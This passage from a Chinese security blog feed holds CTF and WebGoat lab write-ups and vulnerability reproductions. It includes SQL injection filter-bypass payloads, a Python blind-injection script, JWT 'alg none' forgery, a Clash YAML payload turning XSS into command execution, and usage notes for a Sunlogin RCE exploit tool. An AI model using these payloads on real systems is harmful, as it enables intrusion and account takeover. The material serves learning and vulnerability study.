class="hljs-variable">$result</span>))&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;登陆成功&lt;br&gt;&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br> &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>可以看到sql语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span><span class="hljs-operator">=</span>&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,<span class="hljs-literal">true</span>).&quot;&#x27;&quot;;   <br></code></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220311213635981.png" alt="image-20220311213635981"></p><p>也就是我们的passwd要传入一个经过md5加密后16进制转字符串后包含‘or’的值</p><p>例如：<strong>ffifdyop</strong></p><p><img src="/posts/fa386b67/image-20220311214754459.png" alt="image-20220311214754459"></p><h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><p>打开又是一个登录框</p><p><img src="/posts/fa386b67/image-20220312212750883.png" alt="image-20220312212750883"></p><p>点击取消出现源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replaceSpecialChar</span>(<span class="hljs-params"><span class="hljs-variable">$strParam</span></span>)</span>&#123;<br>             <span class="hljs-variable">$regex</span> = <span class="hljs-string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;<br>             <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$regex</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$strParam</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$con</span>)<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>());<br>        &#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span class="hljs-variable">$username</span>)))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span class="hljs-variable">$password</span>)))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span>==<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;登陆成功&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br> &#125;<br>&#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到select，sleep 等等都被过滤了</p><p>同时没有办法使用双写绕过</p><p>可以使用group by</p><p>group up 会按照后的参数进行排列</p><p>group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计</p><p><code>with rollup</code>的作用是：在最后记录后面新增一行，显示select查询时聚合函数的统计和计算结果</p><p>也就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> 列名  <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">ROLLUP</span><br></code></pre></td></tr></table></figure><p>这是不使用WITH ROLLUP的效果</p><p><img src="/posts/fa386b67/image-20220312224015749.png" alt="image-20220312224015749"></p><p>这是使用WITH ROLLUP的效果</p><p><img src="/posts/fa386b67/image-20220312224040151.png" alt="image-20220312224040151"></p><p>可以看出多了一行password多出了一个NULL对应的值为4也就是前面2+1+1的值 也就是说在group by的基础上WITH ROLLUP又把前面的值汇总了一遍</p><p>利用这一特性我们就可以进行绕过</p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</span><br></code></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220312224702958.png" alt="image-20220312224702958"></p><p>拿到flag</p><p><img src="/posts/fa386b67/image-20220312224233107.png" alt="image-20220312224233107"></p><h2 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h2><p>打开靶机发现一个登录界面，试下弱口令</p><p>admin admin888</p><p><img src="/posts/fa386b67/image-20220306182257359.png" alt="image-20220306182257359"></p><p>看到一张图片F12看下源码</p><p><img src="/posts/fa386b67/image-20220306182357918.png" alt="image-20220306182357918"></p><p>发现一行神秘编码 base64解码下</p><p><img src="/posts/fa386b67/image-20220306182428648.png" alt="image-20220306182428648"></p><p>发现只有一半 接下来找一找另一半</p><p>把图片下载下来</p><p>在详细信息里发现了</p><p><img src="/posts/fa386b67/image-20220306182517451.png" alt="image-20220306182517451"></p><p>解码</p><p><img src="/posts/fa386b67/image-20220306182543998.png" alt="image-20220306182543998"></p><p>搞定提交</p><p><img src="/posts/fa386b67/image-20220306182802861.png" alt="image-20220306182802861"></p><p>？？？ 假的flag改了大小写还是不行重新试下</p><p>登录抓包</p><p><img src="/posts/fa386b67/image-20220306183022208.png" alt="image-20220306183022208"></p><p>我去。。。。</p><p>base解码这次成功了。。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Clash RCE漏洞复现分析</title>
    <link href="/posts/cb677a8d/"/>
    <url>/posts/cb677a8d/</url>
    
    <content type="html"><![CDATA[<h1 id="Clash-RCE漏洞复现分析"><a href="#Clash-RCE漏洞复现分析" class="headerlink" title="Clash RCE漏洞复现分析"></a>Clash RCE漏洞复现分析</h1><blockquote><p>请各位师傅们务必在本地进行测试，切勿用于非法用途，后果自负。</p></blockquote><blockquote><p>影响范围：</p><p>已知版本&lt;0.19.10受其影响</p></blockquote><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote><p>Clash：一个 Go 语言开发的多平台代理客户端，懂得都懂</p></blockquote><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>版本需要小于0.19.10</p><p>打开clash选择配置(Profiles)</p><p><img src="/posts/cb677a8d/image-20220228221010788.png" alt="image-20220228221010788"><br>导入POC文件</p><blockquote><p>POC下载：<a href="https://github.com/fattygo/poc-">https://github.com/fattygo/poc-</a></p></blockquote><p>右键连接代理（Proxies）</p><p><img src="/posts/cb677a8d/image-20220228222445170.png" alt="image-20220228222445170"></p><p>执行成功</p><p><img src="/posts/cb677a8d/image-20220228222517633.png" alt="image-20220228222517633"></p><blockquote><p>本次复现仅供学习，切勿用于非法用途，后果自负。</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先看下正常的代理yml文件</p><p>节点之一</p><p><img src="/posts/cb677a8d/image-20220301224509405.png" alt="image-20220301224509405"></p><p>在Clash中的展示为</p><p><img src="/posts/cb677a8d/image-20220301224603800.png" alt="image-20220301224603800"></p><p>不难看出，proxies中的name和type，proxy-groups都展示了出来，这里就联想到xss漏洞</p><p>写个yml来试下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">port:</span> <span class="hljs-number">7890</span><br><span class="hljs-attr">socks-port:</span> <span class="hljs-number">7891</span><br><span class="hljs-attr">redir-port:</span> <span class="hljs-number">7892</span><br><span class="hljs-attr">allow-lan:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">mode:</span> <span class="hljs-string">Rule</span><br><span class="hljs-attr">log-level:</span> <span class="hljs-string">silent</span><br><span class="hljs-attr">external-controller:</span> <span class="hljs-string">&#x27;0.0.0.0:9090&#x27;</span><br><span class="hljs-attr">secret:</span> <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-attr">proxies:</span><br>  <span class="hljs-bullet">-</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">&#x27;&lt;img src=x onerror=alert(1) /&gt;&#x27;</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">trojan</span><br>    <span class="hljs-attr">server:</span> <span class="hljs-string">test</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">45645</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-number">20133544</span><span class="hljs-number">-3417</span><span class="hljs-number">-3062</span><span class="hljs-string">-8ff8-b1dbd032948f</span><br></code></pre></td></tr></table></figure><p>连接代理</p><p><img src="/posts/cb677a8d/image-20220301225601973.png" alt="image-20220301225601973"></p><p><img src="/posts/cb677a8d/image-20220301225620728.png" alt="image-20220301225620728"></p><p>成功弹窗，因此证明了XSS漏洞存在</p><p>接下来改为RCE漏洞试下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">port:</span> <span class="hljs-number">7890</span><br><span class="hljs-attr">socks-port:</span> <span class="hljs-number">7891</span><br><span class="hljs-attr">redir-port:</span> <span class="hljs-number">7892</span><br><span class="hljs-attr">allow-lan:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">mode:</span> <span class="hljs-string">Rule</span><br><span class="hljs-attr">log-level:</span> <span class="hljs-string">silent</span><br><span class="hljs-attr">external-controller:</span> <span class="hljs-string">&#x27;0.0.0.0:9090&#x27;</span><br><span class="hljs-attr">secret:</span> <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-attr">proxies:</span><br>  <span class="hljs-bullet">-</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">&#x27;&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;&#x27;</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">trojan</span><br>    <span class="hljs-attr">server:</span> <span class="hljs-string">test</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">45645</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-number">20133544</span><span class="hljs-number">-3417</span><span class="hljs-number">-3062</span><span class="hljs-string">-8ff8-b1dbd032948f</span><br></code></pre></td></tr></table></figure><p>连接代理</p><p><img src="/posts/cb677a8d/image-20220301230010284.png" alt="image-20220301230010284"></p><p>命令执行成功</p><p>由此看来这个漏洞有些鸡肋属于<code>self-xss</code>但是要知道Clash的配置文件大部分都是从代理url下载而来，这样以来危险也就由之而来，一些心存心存恶念的人提供一些免费的代理导致贪图便宜的兄弟中招，也就是常见的钓鱼</p><p>并且大部分人使用Clash不会去详细看yml文件，直接下载下来使用最后中招。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>将Clash更新到最新版本</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>向日葵 RCE复现</title>
    <link href="/posts/35386fe0/"/>
    <url>/posts/35386fe0/</url>
    
    <content type="html"><![CDATA[<h1 id="Sunlogin-RCE复现-CNVD-2022-10270"><a href="#Sunlogin-RCE复现-CNVD-2022-10270" class="headerlink" title="Sunlogin RCE复现(CNVD-2022-10270)"></a>Sunlogin RCE复现(CNVD-2022-10270)</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270">https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270</a></p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>windows 个人版 V11.0.0.33 V10.3.0.27372 V11.0.0.33162</p><p>简约版 V1.0.1.43315</p></blockquote><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><a href="https://github.com/Mr-xn/sunlogin_rce/releases">Releases · Mr-xn&#x2F;sunlogin_rce (github.com)</a></p><p>使用方式</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-h 指定目标</span><br><br><span class="hljs-deletion">-t 选择扫描或者命令执行 默认scan</span><br><br><span class="hljs-deletion">-p 设置扫描端口范围 默认40000到65535</span><br><br><span class="hljs-deletion">-c 需要执行的命令</span><br></code></pre></td></tr></table></figure><p><img src="/posts/35386fe0/j3qNXASt5GWPMpB.png" alt="image-20220515223200470"></p><p><img src="/posts/35386fe0/qkTbI1ZLEyu2lHM.png" alt="image-20220515223216200"></p><p>经测试好像只有本机利用才会有回显</p><p><img src="/posts/35386fe0/xsfCZyJtE1L2ilj.png" alt="image-20220515223628294"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA安全-JWT安全及预编译 CASE 注入</title>
    <link href="/posts/43f09137/"/>
    <url>/posts/43f09137/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA安全-JWT-安全及预编译-CASE-注入"><a href="#JAVA安全-JWT-安全及预编译-CASE-注入" class="headerlink" title="JAVA安全-JWT 安全及预编译 CASE 注入"></a>JAVA安全-JWT 安全及预编译 CASE 注入</h1><h2 id="JAVA中的sql注入"><a href="#JAVA中的sql注入" class="headerlink" title="JAVA中的sql注入"></a>JAVA中的sql注入</h2><h3 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection(mitigation)"></a>SQL Injection(mitigation)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">防御 sql 注入，其实就是 session，参数绑定，存储过程这样的注入。<br><br><span class="hljs-comment">// 利用 session 防御，session 内容正常情况下是用户无法修改的 select * from users where user = &quot;&#x27;&quot; +</span><br>session.getAttribute(<span class="hljs-string">&quot;UserID&quot;</span>) + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br><br><span class="hljs-comment">// 参数绑定方式，利用了 sql 的预编译技术</span><br><span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM users WHERE last_name = ?&quot;</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.prepareStatement(query);<br>statement.setString(<span class="hljs-number">1</span>, accountName);<br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">results</span> <span class="hljs-operator">=</span> statement.executeQuery();<br><br>上面说的方式也不是能够绝对的进行 sql 注入防御，只是减轻。<br><br>如参数绑定方式可以使用下面方式绕过。<br>通过使用 <span class="hljs-keyword">case</span> when 语句可以将 order by 后的 orderExpression 表达式中添加 select 语句。（前提是必须存在order by）<br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/klyjb/p/11473857.html">JDBC编程之预编译SQL与防注入 - 加了冰的才叫可乐 - 博客园 (cnblogs.com)</a></p><h3 id="Javaweb-SQL-注入攻击-预编译机制绕过（WebGoat靶场）"><a href="#Javaweb-SQL-注入攻击-预编译机制绕过（WebGoat靶场）" class="headerlink" title="Javaweb-SQL 注入攻击-预编译机制绕过（WebGoat靶场）"></a>Javaweb-SQL 注入攻击-预编译机制绕过（WebGoat靶场）</h3><p><img src="/posts/43f09137/image-20220204205002145.png" alt="image-20220204205002145"></p><p>点击ip排序</p><p><img src="/posts/43f09137/image-20220204205222142.png" alt="image-20220204205222142"></p><p>将column参数随便改下看下报错</p><p>返回包中发现orderby可以使用case when 绕过</p><p><img src="/posts/43f09137/image-20220204210343988.png" alt="image-20220204210343988"></p><p>使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> digits<br><br>chars = digits + <span class="hljs-string">&quot;.&quot;</span><br>data1 = <span class="hljs-string">&quot;username_reg=tomx&#x27;+union+select+password+from+sql_challenge_users+where+userid%3D&#x27;teom&#x27;--+-&amp;email_reg=7702%40qq.com&amp;password_reg=123&amp;confirm_password_reg=123&quot;</span><br>headers = &#123;<span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>&#125;<br>cookies = &#123;<br>    <span class="hljs-string">&#x27;JSESSIONID&#x27;</span>: <span class="hljs-string">&#x27;lCNtTT1xRD0U-7U8zcjIbyRXzLH_DAvz7jGuMvj0&#x27;</span>,<br>    <span class="hljs-string">&#x27;JSESSIONID.75fbd09e&#x27;</span>: <span class="hljs-string">&#x27;7mc1x9iei6ji4xo2a3u4kbz1&#x27;</span><br>&#125;<br>i = <span class="hljs-number">0</span><br>result = <span class="hljs-string">&quot;&quot;</span><br>proxy = &#123;<span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8888&quot;</span>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i += <span class="hljs-number">1</span><br>    temp = result<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> chars:<br>        vul_url = <span class="hljs-string">&quot;http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;%20from%20servers%20where%20hostname=&#x27;webgoat-prd&#x27;)%20then%20hostname%20else%20mac%20end&quot;</span>.<span class="hljs-built_in">format</span>(i, char)<br>        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)<br>        <span class="hljs-comment"># print(resp.json())</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;webgoat-prd&#x27;</span> <span class="hljs-keyword">in</span> resp.json()[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;hostname&#x27;</span>]:<br>            result += char<br>            <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">if</span> temp == result:<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p><img src="/posts/43f09137/image-20220204211625244.png" alt="image-20220204211625244"></p><h2 id="什么是-JWT？"><a href="#什么是-JWT？" class="headerlink" title="什么是 JWT？"></a>什么是 JWT？</h2><blockquote><p>JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT 不加密传输的数据，但能够通过数字签名来验证数据未被篡改</p></blockquote><p><img src="/posts/43f09137/image-20220205224641299.png" alt="image-20220205224641299"></p><p>JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号.隔开。JWT 的内容以 Base64URL 进行了编码。签名在base64加密前使用密钥加密</p><p><img src="/posts/43f09137/image-20220205110312210.png" alt="image-20220205110312210"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">头部（Header）<br><span class="hljs-punctuation">&#123;</span> <br><span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br>alg是说明这个JWT 的签名使用的算法的参数，常见值用 HS256（默认），HS512 等，也可以为 None。HS256表示 HMAC SHA256。<br>typ说明这个 token 的类型为 JWT<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json">声明（Claims）<br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1416471934</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;user_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;user&quot;</span><span class="hljs-punctuation">,</span> <br><span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;read&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;write&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;authorities&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> <span class="hljs-string">&quot;ROLE_ADMIN&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;ROLE_USER&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;jti&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;client_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-client-with-secret&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br>JWT 固定参数有： <br>iss： 发 行 人 <br>exp： 到 期 时 间 <br>sub： 主 题   <br>aud： 用 户    <br>nbf：在此之前不可用iat：发布时间<br>jti：JWT ID 用于标识该 JWT<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">签名（Signature）<br>服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密码进行加密，生成的字符串就是 JWT 的签名。<br>下面是一个用 HS256 生成 JWT 的代码例子<br>HMACSHA256(base64UrlEncode(header) + <span class="hljs-string">&quot;.&quot;</span> + base64UrlEncode(payload)<span class="hljs-punctuation">,</span>secret)<br></code></pre></td></tr></table></figure><p>1、用户端登录，用户名和密码在请求中被发往服务器<br>2、（确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时，服务器并没有保存登录状态信息。<br>3、服务器将 JWT（通过响应）返回给客户端<br>4、用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中<br>5、服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态<br>6、服务器返回响应</p><p><img src="/posts/43f09137/image-20220205111357736.png" alt="image-20220205111357736"></p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="Javaweb-身份验证攻击-JWT-修改伪造攻击（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT-修改伪造攻击（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT 修改伪造攻击（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT 修改伪造攻击（WebGoat靶场）</h4><p>#了解 JWT 传输过程，验证机制</p><p>#了解 JWT 结构，加解密过程及注意事项</p><p><img src="/posts/43f09137/image-20220205111928593.png" alt="image-20220205111928593"></p><p><img src="/posts/43f09137/image-20220205112844469.png" alt="image-20220205112844469"></p><p>点击切换用户</p><p><img src="/posts/43f09137/image-20220205112926183.png" alt="image-20220205112926183"></p><p>抓包</p><p><img src="/posts/43f09137/image-20220205112938904.png" alt="image-20220205112938904"></p><p>发现access_token值为空</p><p>再点击删除键</p><p><img src="/posts/43f09137/image-20220205113051705.png" alt="image-20220205113051705"></p><p><img src="/posts/43f09137/image-20220205113106249.png" alt="image-20220205113106249"></p><p>数据包中发现access_token值</p><p>到<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>解密看下</p><p><img src="/posts/43f09137/image-20220205114647600.png" alt="image-20220205114647600"></p><p>发现”admin”: “false”,改为true就是管理员权限</p><p>但是这样还不行 我们的签名部分无法修改</p><p>注意：</p><p>问题来了，因为 JWT 的声明内容变了，因此签名需要重新生成，生成签名又需要密码，我们没有密码呀？不要慌，我们直接去掉签名就好~修改头部为 None</p><p>我们无法获取到密钥也就无法更改签名 那么我们就修改头部文件”alg”:”HS256”改为”alg”:”none”</p><p><img src="/posts/43f09137/image-20220205120229198.png" alt="image-20220205120229198"></p><p><img src="/posts/43f09137/image-20220205120509791.png" alt="image-20220205120509791"></p><p>签名部分我们采用不加密也就是要留空</p><p>在 HTTP 传输过程中，Base64 编码中的”&#x3D;”,”+”,”&#x2F;“等特殊符号通过 URL 解码通常容易产生歧义，因此产生了与 URL 兼容的 Base64 URL 编码</p><p>也就是jwt在传输的时候要删掉这些符号</p><p>最后结果</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ewogICJhbGciOiAib<span class="hljs-name">m9</span>uZSIKfQ.ewogICJpYXQiOiAx<span class="hljs-symbol">NjQ0</span>ODk<span class="hljs-number">1</span>ODIyLAogICJhZ<span class="hljs-name">G1</span>pbiI<span class="hljs-number">6</span>ICJ<span class="hljs-number">0</span>c<span class="hljs-symbol">nVlIiwKICAidXNlciI6</span>ICJUb<span class="hljs-number">20</span>iC<span class="hljs-symbol">n0</span>.<br></code></pre></td></tr></table></figure><p>完成</p><p>再把这串编码拿到burp中修改</p><p>攻击成功前提条件：服务器端没有验证是否有签名</p><h4 id="Javaweb-身份验证攻击-JWT-密钥爆破攻击（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT-密钥爆破攻击（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT 